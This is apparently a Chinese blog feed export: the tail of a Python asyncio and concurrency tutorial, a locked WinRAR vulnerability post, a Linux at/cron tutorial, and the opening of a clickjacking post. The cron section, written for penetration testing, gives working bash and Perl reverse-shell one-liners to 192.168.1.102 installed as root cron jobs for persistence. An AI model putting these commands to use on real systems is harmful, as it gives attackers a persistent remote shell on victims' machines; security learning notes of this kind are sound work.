class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">10.076906442642212</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多线程(以10次请求为例)：由于无法进行异步及GIL的存在，效率很低，上下文的切换导致开销，甚至时间比单线程更长一点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target = Request())</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.073291301727295</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="同时使用多进程和异步协程进行请求"><a href="#同时使用多进程和异步协程进行请求" class="headerlink" title="同时使用多进程和异步协程进行请求"></a>同时使用多进程和异步协程进行请求</h3><blockquote>
<p>异步协程和多进程对网络请求都有提升,将二者结合起来：Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess</p>
</blockquote>
<ol>
<li><p>安装aiomultiprocess  <code>pip3 install aiomultiprocess</code></p>
</li>
<li><p>改写请求网络的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> aiomultiprocess <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    urls = [url <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Pool() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> pool.map(get, urls)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">coroutine = request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>, end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="骚思路学习"><a href="#骚思路学习" class="headerlink" title="骚思路学习"></a>骚思路学习</h3><h4 id="requests实现异步爬虫一"><a href="#requests实现异步爬虫一" class="headerlink" title="requests实现异步爬虫一"></a>requests实现异步爬虫一</h4><blockquote>
<p>如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。</p>
</blockquote>
<ul>
<li><p>解决方案：这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。</p>
</li>
<li><p>run_in_executor方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AbstractEventLoop.run_in_executor(executor, func, *args)</span><br><span class="line">executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。</span><br><span class="line">func 就是要执行的函数</span><br><span class="line">args 就是传递给 func 的参数</span><br></pre></td></tr></table></figure>
</li>
<li><p>实例（使用time.sleep()）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"start "</span>,url)</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> loop.run_in_executor(<span class="keyword">None</span>,time.sleep,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    print(<span class="string">"stop "</span>,url)</span><br><span class="line">url_list = [<span class="string">"https://thief.one"</span>,<span class="string">"https://home.nmask.cn"</span>,<span class="string">"https://movie.nmask.cn"</span>,<span class="string">"https://tool.nmask.cn"</span>]</span><br><span class="line">tasks = [asyncio.ensure_future(run(url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">start  https://thief.one</span><br><span class="line">start  https://home.nmask.cn</span><br><span class="line">start  https://movie.nmask.cn</span><br><span class="line">start  https://tool.nmask.cn</span><br><span class="line">stop  https://home.nmask.cn</span><br><span class="line">stop  https://thief.one</span><br><span class="line">stop  https://tool.nmask.cn</span><br><span class="line">stop  https://movie.nmask.cn</span><br></pre></td></tr></table></figure>
</li>
<li><p>有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。</p>
</li>
</ul>
<h4 id="requests实现异步爬虫二"><a href="#requests实现异步爬虫二" class="headerlink" title="requests实现异步爬虫二"></a>requests实现异步爬虫二</h4><blockquote>
<p>上面说了通过run_in_executor方法来添加线程的方式实现异步。在与之前学过的多线程、多进程相比，asyncio模块有一个非常大的不同：传入的函数不是随心所欲，所以这里以实现time.sleep的时的异步；以及修改函数为一个我们自己定义的函数。</p>
</blockquote>
<ol>
<li><p>实现time.sleep时的异步（run_in_executor开启了新的线程，再协调各个线程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    futures = (</span><br><span class="line">        loop.run_in_executor(</span><br><span class="line">            <span class="keyword">None</span>,</span><br><span class="line">            myfun,</span><br><span class="line">            i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">start <span class="number">0</span>th</span><br><span class="line">start <span class="number">1</span>th</span><br><span class="line">start <span class="number">2</span>th</span><br><span class="line">start <span class="number">3</span>th</span><br><span class="line">start <span class="number">4</span>th</span><br><span class="line">start <span class="number">5</span>th</span><br><span class="line">start <span class="number">6</span>th</span><br><span class="line">start <span class="number">7</span>th</span><br><span class="line">start <span class="number">8</span>th</span><br><span class="line">start <span class="number">9</span>th</span><br><span class="line">finish <span class="number">0</span>th</span><br><span class="line">finish <span class="number">3</span>th</span><br><span class="line">finish <span class="number">2</span>th</span><br><span class="line">finish <span class="number">1</span>th</span><br><span class="line">finish <span class="number">5</span>th</span><br><span class="line">finish <span class="number">4</span>th</span><br><span class="line">finish <span class="number">6</span>th</span><br><span class="line">finish <span class="number">7</span>th</span><br><span class="line">finish <span class="number">8</span>th</span><br><span class="line">finish <span class="number">9</span>th</span><br><span class="line"><span class="number">1.008263111114502</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改开启的线程数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf <span class="comment"># 多加一个模块</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor: <span class="comment"># 设置10个线程</span></span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor, <span class="comment"># 按照10个线程来执行</span></span><br><span class="line">                myfun,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改函数为爬去豆瓣的电影标题(实际上没有出发异步)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(a)</span>:</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(a*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">fun_list = (get_title(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">loop.run_until_complete(asyncio.gather(*fun_list))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分结果）</span></span><br><span class="line">变脸</span><br><span class="line">卡萨布兰卡</span><br><span class="line">海盗电台</span><br><span class="line"><span class="number">8.284837245941162</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改用run_in_executor开启了新的线程触发异步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(i*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor,</span><br><span class="line">                get_title,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"></span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分）</span></span><br><span class="line">当幸福来敲门</span><br><span class="line">乱世佳人</span><br><span class="line">怦然心动</span><br><span class="line"><span class="number">0.8107953071594238</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过对比可以看出python中协程可以极大的提升I/O操作的效率，在上述爬去豆瓣的250个电影标题中效率提升了一个数量级。</p>
</li>
</ol>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><blockquote>
<p>第三方库uvloop可以对aiohttp加速，uvloop库基于libuv，也就是nodejs用的那个库。使用它也非常方便；有一个问题就是uvloop仅支持在Linux下的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> asyncio</span><br><span class="line">&gt;<span class="keyword">import</span> uvloop</span><br><span class="line">&gt;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次通过学习python协程，对于python的高并发、异步编程做了较为全面的了解，同时对python的多线程、多进程、线程池、进程池等问题进行了回顾总结，提升编写工具的性能，目前来说满足了需求，通过本次学习，弥补了一些短板的地方。学习任重而道远！</p>
<h4 id="本次学习参考的资料链接如下："><a href="#本次学习参考的资料链接如下：" class="headerlink" title="本次学习参考的资料链接如下："></a>本次学习参考的资料链接如下：</h4><p>[]:<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000</a></p>
<p>[]:<a href="https://cuiqingcai.com/6160.html" target="_blank" rel="noopener">https://cuiqingcai.com/6160.html</a></p>
<p>[]:<a href="http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title>winRAR远程代码执行漏洞复现(CVE-2018-20250)</title>
    <url>/2018/11/08/winRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2018-20250/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>winRAR</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux定时任务</title>
    <url>/2018/11/08/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h3 id="Linux中的定时任务"><a href="#Linux中的定时任务" class="headerlink" title="Linux中的定时任务"></a>Linux中的定时任务</h3><blockquote>
<p>主要是为了在Linux中进行一些定时操作，定时任务在平时见到的挖矿中比较多，在渗透中定时任务可以用在反弹shell,在这里记录放在再被网上的坑爹文章误导了</p>
</blockquote>
<p>计划任务主要分为定时型的还有突发性的</p>
<h3 id="定时任务——突发性"><a href="#定时任务——突发性" class="headerlink" title="定时任务——突发性"></a>定时任务——突发性</h3><p>at：它是一个可以处理仅执行一次就结束的指令 </p>
<p>at语法格式：at 时间 </p>
<p>安装at   <code>sudo apt-get update &amp;&amp; sudo apt-get install at</code></p>
<p>启动服务  <code>sudo systemctl restart atd</code></p>
<p><strong>at计划任务的特殊写法</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at 20:00 2018-10-1 在某天</span><br><span class="line"></span><br><span class="line">at now +10min 在 10分钟后执行</span><br><span class="line"></span><br><span class="line">at 17:00 tomorrow 明天下午5点执行</span><br><span class="line"></span><br><span class="line">at 6:00 pm +3 days 在3天以后的下午6点执行</span><br></pre></td></tr></table></figure>
<p>实例：重定向字符串到一个txt中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at now + 1min </span><br><span class="line">warning: commands will be executed using /bin/sh</span><br><span class="line">at&gt; <span class="built_in">echo</span> <span class="string">"at_test"</span> &gt;&gt; ./ats.txt	</span><br><span class="line"><span class="comment">#然后按  ctrl + d保存</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220165.48.png" alt></p>
<p><strong>删除计划任务</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atq</span><br><span class="line">atrm   任务编号</span><br><span class="line">atq</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220285.31.png" alt></p>
<h3 id="定时任务——定时性"><a href="#定时任务——定时性" class="headerlink" title="定时任务——定时性"></a>定时任务——定时性</h3><blockquote>
<p>有两种方式：cron和crontab，两种在写配置文件时语法基本一致，唯一不同点在与使用cron时在/etc/cron.d/目录下写的定时任务的文件中必须要带上执行定时任务的用户，任务才可以执行；而crontab可以不用执行用户即可执行，使用场景不一样，但是一般在反弹shell时使用写入配置文件比较好。</p>
</blockquote>
<h4 id="crontab定时任务的使用"><a href="#crontab定时任务的使用" class="headerlink" title="crontab定时任务的使用"></a>crontab定时任务的使用</h4><p>语法：#crontab -u -e</p>
<p>常用选项：</p>
<p>-l：list，列出指定用户的计划任务列表</p>
<p>-e：edit，编辑指定用户的计划任务列表</p>
<p>-u：user，指定的用户名，如果不指定，则表示当前用户</p>
<p>-r：remove，删除指定用户的计划任务列表</p>
<p><strong>查看计划任务：</strong> <code>crontab -l</code></p>
<p><strong>编写计划任务：</strong> <code>crontab -e</code> </p>
<p>计划任务的规则语法格式，以行为单位，一行为一个计划：</p>
<p><strong>分 时 日 月 周</strong> 需要执行的命令</p>
<p>执行的命令建议写成<strong>绝对路径</strong>的格式！</p>
<p>取值范围（常识）：</p>
<p>分：0~59</p>
<p>时：0~23</p>
<p>日：1~31</p>
<p>月：1~12</p>
<p>周：0~7，0和7表示星期天</p>
<p>四个符号：</p>
<p>*：表示取值范围中的每一个数字</p>
<p>-：做连续区间表达式的，要想表示1~7，则可以写成：1-7</p>
<p>/：表示每多少个，例如：想每10分钟一次，则可以在分的位置写：*/10</p>
<p>,：表示多个取值，比如想在1点，2点6点执行，则可以在时的位置写：1,2,6</p>
<p><strong>删除命令：</strong> <code>crontab -r</code></p>
<p>实例：利用crontab写入计划任务反弹shell(每隔一分钟执行一次)</p>
<p>bash反弹shell指令在计划任务中不太好使，利用Perl加载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">*/1 * * * * /usr/bin/perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
<p>crontab -e写入计划任务</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222011.42.png" alt></p>
<h4 id="写入-etc-cron-d目录-常用"><a href="#写入-etc-cron-d目录-常用" class="headerlink" title="写入/etc/cron.d目录(常用)"></a>写入/etc/cron.d目录(常用)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/cron.d</span><br><span class="line">vim root</span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;192.168.1.102&quot;;$p=8889;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222307.76.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/getbird/p/10857254.html" target="_blank" rel="noopener">https://www.cnblogs.com/getbird/p/10857254.html</a> </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>界面劫持</title>
    <url>/2018/10/27/%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。</p>
<h3 id="界面劫持分类"><a href="#界面劫持分类" class="headerlink" title="界面劫持分类"></a>界面劫持分类</h3><ul>
<li>点击劫持：劫持用户的鼠标点击操作</li>
